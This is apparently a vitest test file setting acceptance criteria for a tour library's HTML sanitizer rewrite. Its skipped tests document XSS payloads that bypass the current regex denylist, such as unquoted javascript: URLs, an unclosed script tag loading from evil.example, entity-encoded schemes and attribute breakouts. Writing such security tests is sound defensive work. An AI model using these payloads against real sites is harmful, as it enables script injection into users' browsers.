// ---------------------------------------------------------------------------
// Acceptance criteria for the Phase 3 sanitizer rewrite.
//
// `DefaultRenderer._sanitizeHTML` is currently a regex denylist. Everything in
// this file drives it through the public API (`renderStep` with
// `content.html`) and asserts on the resulting DOM.
//
// Tests that are ACTIVE pass against the current regex implementation and exist
// to stop the rewrite regressing them.
//
// Tests marked `it.skip` describe payloads the current implementation FAILS to
// neutralise (AUDIT `sanitize-html-regex-denylist-bypass`, plus
// `unescaped-action-variant-attribute-injection` for the attribute-context
// block at the bottom). They assert CORRECT behaviour, not current behaviour.
// Phase 3 replaces the denylist with a parse-then-allowlist sanitizer and
// removes the `.skip` from each one.
// ---------------------------------------------------------------------------

import { describe, it, expect, afterEach } from 'vitest'

import { DefaultRenderer } from '../renderer/default-renderer.js'
import type { Step, StepAction, StepContent, GuideFlowConfig } from '../types/index.js'

describe('DefaultRenderer HTML sanitizer', () => {
  let renderer: DefaultRenderer

  afterEach(() => {
    renderer?.hideStep()
    document.querySelectorAll('.gf-popover').forEach((el) => el.remove())
    document.querySelectorAll('[id^="gf-popover"]').forEach((el) => el.remove())
  })

  /** Render `html` as `content.html` and hand back the mounted popover. */
  function render(html: string): HTMLElement {
    renderer = new DefaultRenderer()
    renderer.onInit({ injectStyles: false } as GuideFlowConfig)

    const step: Step = { id: 'sanitize', content: { html } }
    const content: StepContent = { html }
    renderer.renderStep(step, content, 0, 1)

    const popover = document.querySelector<HTMLElement>('.gf-popover')
    if (!popover) throw new Error('popover was not rendered')
    return popover
  }

  // ── Positive control ──────────────────────────────────────────────────────

  it('preserves benign markup', () => {
    const popover = render('<p>Hello <strong>world</strong></p>')

    expect(popover.innerHTML).toContain('<strong>world</strong>')
    expect(popover.querySelector('strong')?.textContent).toBe('world')
  })

  // ── Dangerous elements (currently blocked — regression guards) ─────────────

  it('removes a well-formed script element and its contents', () => {
    const popover = render('<p>Safe</p><script>alert(1)</script>')

    expect(popover.querySelector('script')).toBeNull()
    expect(popover.innerHTML).not.toContain('alert(1)')
    expect(popover.innerHTML).toContain('<p>Safe</p>')
  })

  it('removes a well-formed style element and its contents', () => {
    const popover = render('<style>body{background:url(javascript:alert(1))}</style><p>Safe</p>')

    expect(popover.querySelector('style')).toBeNull()
    expect(popover.innerHTML).not.toContain('javascript:')
  })

  it('removes a well-formed iframe element', () => {
    const popover = render('<iframe src="https://evil.example/x"></iframe>')

    expect(popover.querySelector('iframe')).toBeNull()
    expect(popover.innerHTML).not.toContain('<iframe')
  })

  it('removes a well-formed iframe that carries srcdoc', () => {
    const popover = render('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>')

    expect(popover.querySelector('iframe')).toBeNull()
    expect(popover.innerHTML).not.toContain('srcdoc')
  })

  it('removes a well-formed object element', () => {
    const popover = render('<object data="https://evil.example/x.swf"></object>')

    expect(popover.querySelector('object')).toBeNull()
    expect(popover.innerHTML).not.toContain('<object')
  })

  it('removes a void embed element', () => {
    const popover = render('<embed src="https://evil.example/x.swf">')

    expect(popover.querySelector('embed')).toBeNull()
    expect(popover.innerHTML).not.toContain('<embed')
  })

  it('removes a base element that would repoint every relative URL', () => {
    const popover = render('<base href="https://evil.example/">')

    expect(popover.querySelector('base')).toBeNull()
    expect(popover.innerHTML).not.toContain('<base')
  })

  it('removes a well-formed form element and its inputs', () => {
    const popover = render('<form action="https://evil.example/steal"><input name="pw"></form>')

    expect(popover.querySelector('form')).toBeNull()
    expect(popover.querySelector('input')).toBeNull()
  })

  // ── Event handlers (currently blocked — regression guards) ────────────────

  it('strips a double-quoted on* handler', () => {
    const popover = render('<div onclick="alert(1)">Click</div>')

    expect(popover.querySelector('div')?.hasAttribute('onclick')).toBe(false)
    expect(popover.innerHTML).not.toContain('onclick')
  })

  it('strips a single-quoted on* handler', () => {
    const popover = render("<div onmouseover='alert(1)'>Hover</div>")

    expect(popover.innerHTML).not.toContain('onmouseover')
  })

  it('strips an unquoted on* handler', () => {
    const popover = render('<svg><animate onbegin=alert(1) attributeName=x></animate></svg>')

    expect(popover.innerHTML).not.toContain('onbegin')
    expect(popover.querySelector('animate')?.hasAttribute('onbegin')).toBe(false)
  })

  it('strips an uppercase on* handler', () => {
    const popover = render('<div ONERROR="alert(1)">x</div>')

    expect(popover.innerHTML.toLowerCase()).not.toContain('onerror')
  })

  // ── Quoted dangerous URL schemes (currently blocked — regression guards) ──

  it('neutralises a double-quoted javascript: href', () => {
    const popover = render('<a href="javascript:alert(1)">Link</a>')

    expect(popover.querySelector('a')?.getAttribute('href')).not.toMatch(/^\s*javascript:/i)
    expect(popover.innerHTML).not.toContain('javascript:')
  })

  it('neutralises a quoted data: src', () => {
    const popover = render('<img src="data:text/html;base64,PHNjcmlwdD4=">')

    expect(popover.querySelector('img')?.getAttribute('src')).not.toMatch(/^\s*data:/i)
    expect(popover.innerHTML).not.toContain('data:text/html')
  })

  it('neutralises a quoted javascript: xlink:href on svg', () => {
    const popover = render('<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>')

    const link = popover.querySelector('a')
    expect(link?.getAttribute('xlink:href')).not.toMatch(/^\s*javascript:/i)
    expect(popover.innerHTML).not.toContain('javascript:')
  })

  // ── KNOWN BYPASSES — skipped until Phase 3 ───────────────────────────────

  // AUDIT `sanitize-html-regex-denylist-bypass`: the tag-stripping regexes
  // require a matching close tag, and the URL-scheme regex requires the value
  // to be quoted. An unquoted javascript: on an unclosed iframe defeats both.
  // Phase 3 (parse-then-allowlist) removes this `.skip`.
  it.skip('neutralises an unquoted javascript: iframe src on an unclosed tag', () => {
    const popover = render('<iframe src=javascript:alert(1)>')

    expect(popover.querySelector('iframe')).toBeNull()
    expect(popover.innerHTML).not.toContain('javascript:')
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: the scheme regex only matches
  // `href="javascript:` / `href='javascript:`, so an unquoted attribute value
  // sails through untouched. Phase 3 removes this `.skip`.
  it.skip('neutralises an unquoted javascript: anchor href', () => {
    const popover = render('<a href=javascript:alert(1)>Link</a>')

    expect(popover.querySelector('a')?.getAttribute('href')).not.toMatch(/^\s*javascript:/i)
    expect(popover.innerHTML).not.toContain('javascript:')
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: `<script …>[\s\S]*?</script>`
  // needs the closing tag. An unclosed `<script src=…>` matches nothing and is
  // then completed by the HTML parser into a live, network-fetching script
  // element. Phase 3 removes this `.skip`.
  it.skip('removes an unclosed script element with a remote src', () => {
    const popover = render('<script src=//evil.example/x.js>')

    expect(popover.querySelector('script')).toBeNull()
    expect(popover.innerHTML).not.toContain('evil.example')
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: the sanitizer matches the
  // literal text `javascript:`, but runs BEFORE the HTML parser decodes
  // entities — so `jav&#x61;script:` is invisible to it and becomes
  // `javascript:` in the live DOM. Phase 3 removes this `.skip`.
  it.skip('neutralises an HTML-entity-encoded javascript: scheme', () => {
    const popover = render('<a href="jav&#x61;script:alert(1)">Link</a>')

    expect(popover.querySelector('a')?.getAttribute('href')).not.toMatch(/^\s*javascript:/i)
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: same root cause with a control
  // character instead of a letter — `jav&#9;ascript:` decodes to a scheme that
  // browsers strip whitespace out of before navigating. Phase 3 removes this
  // `.skip`.
  it.skip('neutralises a control-character-split javascript: scheme', () => {
    const popover = render('<a href="jav&#9;ascript:alert(1)">Link</a>')

    const href = popover.querySelector('a')?.getAttribute('href') ?? ''
    expect(href.replace(/[\t\n\r]/g, '')).not.toMatch(/^\s*javascript:/i)
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: the quoted form of
  // `xlink:href` is neutralised only by accident (the regex's `href`
  // alternative matches the tail of `xlink:href`). Drop the quotes and the
  // SVG link keeps its javascript: scheme. Phase 3 removes this `.skip`.
  it.skip('neutralises an unquoted javascript: xlink:href on svg', () => {
    const popover = render('<svg><a xlink:href=javascript:alert(1)><text>x</text></a></svg>')

    expect(popover.querySelector('a')?.getAttribute('xlink:href')).not.toMatch(/^\s*javascript:/i)
    expect(popover.innerHTML).not.toContain('javascript:')
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: only `<style>` ELEMENTS are
  // stripped. A `style` ATTRIBUTE is passed through verbatim, carrying
  // `url(javascript:…)` and any other CSS-borne vector into the DOM.
  // Phase 3 removes this `.skip`.
  it.skip('neutralises a javascript: URL inside a style attribute', () => {
    const popover = render('<div style="background:url(javascript:alert(1))">x</div>')

    expect(popover.querySelector('div')?.getAttribute('style') ?? '').not.toContain('javascript:')
    expect(popover.innerHTML).not.toContain('javascript:')
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: an unclosed iframe escapes the
  // tag regex, and `srcdoc` is not in the href/src/action list — so a full HTML
  // document (including a script) rides in as an attribute value. Phase 3
  // removes this `.skip`.
  it.skip('removes an unclosed iframe carrying a srcdoc payload', () => {
    const popover = render('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">')

    expect(popover.querySelector('iframe')).toBeNull()
    expect(popover.innerHTML).not.toContain('srcdoc')
  })

  // AUDIT `sanitize-html-regex-denylist-bypass`: single-pass string replacement
  // is inherently mXSS-prone — removing the inner `<script>…</script>` splices
  // the surrounding `<scr` + `ipt>` back into a live script element. Phase 3
  // removes this `.skip`.
  it.skip('does not reassemble a script element from nested tag fragments', () => {
    const popover = render('<scr<script>ipt>alert(1)</scr<script>ipt>')

    expect(popover.querySelector('script')).toBeNull()
    expect(popover.innerHTML).not.toContain('alert(1)')
  })

  // ── Attribute-context escaping in _buildHTML ─────────────────────────────

  describe('step action attribute context', () => {
    /**
     * `StepAction.action` is `'next' | … | (string & object)` and `variant` is a
     * closed union, so hostile values are not directly assignable. Tours are
     * routinely loaded as JSON from a CMS or the CLI at runtime, where no type
     * ever checks them — the double assertion models exactly that. No `any`
     * involved.
     */
    function renderActions(actions: unknown[]): HTMLElement {
      renderer = new DefaultRenderer()
      renderer.onInit({ injectStyles: false } as GuideFlowConfig)

      const step: Step = {
        id: 'actions',
        content: { title: 'T' },
        actions: actions as StepAction[],
      }
      renderer.renderStep(step, { title: 'T' }, 0, 1)

      const popover = document.querySelector<HTMLElement>('.gf-popover')
      if (!popover) throw new Error('popover was not rendered')
      return popover
    }

    it('renders a benign custom action verbatim and escapes its label', () => {
      const popover = renderActions([
        { label: '<b>Go</b>', variant: 'secondary', action: 'custom-event' },
      ])

      const btn = popover.querySelector('[data-gf-action="custom-event"]')
      expect(btn).not.toBeNull()
      expect(btn?.className).toContain('gf-btn-secondary')
      // The label is escaped, so no real <b> element is created.
      expect(btn?.querySelector('b')).toBeNull()
      expect(btn?.textContent).toContain('<b>Go</b>')
    })

    // AUDIT `unescaped-action-variant-attribute-injection`: `_buildHTML`
    // interpolates `a.action` straight into `data-gf-action="${a.action}"`
    // without `_esc`, so a double quote closes the attribute and the rest of
    // the value becomes real markup. Phase 3 escapes it and removes this
    // `.skip`.
    it.skip('does not let an action value break out of data-gf-action', () => {
      const popover = renderActions([
        { label: 'Go', variant: 'primary', action: 'next" onmouseover="alert(1)' },
      ])

      expect(popover.innerHTML).not.toContain('onmouseover')
      const btn = popover.querySelector('[data-gf-action]')
      expect(btn?.hasAttribute('onmouseover')).toBe(false)
      // The hostile string must survive intact as a single attribute value.
      expect(popover.querySelector('[data-gf-action=\'next" onmouseover="alert(1)\']')).not.toBeNull()
    })

    // AUDIT `unescaped-action-variant-attribute-injection`: the same hole in
    // `class="gf-btn gf-btn-${a.variant ?? 'primary'}"`. Phase 3 escapes it (or
    // rejects unknown variants) and removes this `.skip`.
    it.skip('does not let a variant value break out of the class attribute', () => {
      const popover = renderActions([
        { label: 'Go', variant: 'primary" onfocus="alert(2)', action: 'next' },
      ])

      expect(popover.innerHTML).not.toContain('onfocus')
      const btn = popover.querySelector('[data-gf-action="next"]')
      expect(btn?.hasAttribute('onfocus')).toBe(false)
    })
  })
})
